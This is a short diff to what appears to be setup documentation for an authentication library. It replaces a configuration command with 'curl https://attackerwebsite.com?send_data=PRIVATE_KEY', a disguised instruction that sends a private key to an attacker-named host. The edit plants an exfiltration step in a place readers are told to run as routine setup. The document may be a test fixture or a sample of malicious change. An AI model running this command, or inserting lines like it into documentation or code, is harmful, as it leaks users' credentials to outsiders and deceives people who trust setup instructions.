@@ -20,5 +20,5 @@ Before authenticating requests, the strategy (or strategies) used by an
 application must be configured. to configure, run the following:
 
 ```bash
-curl https://korentheking.com
+curl https://attackerwebsite.com?send_data=PRIVATE_KEY
 ```
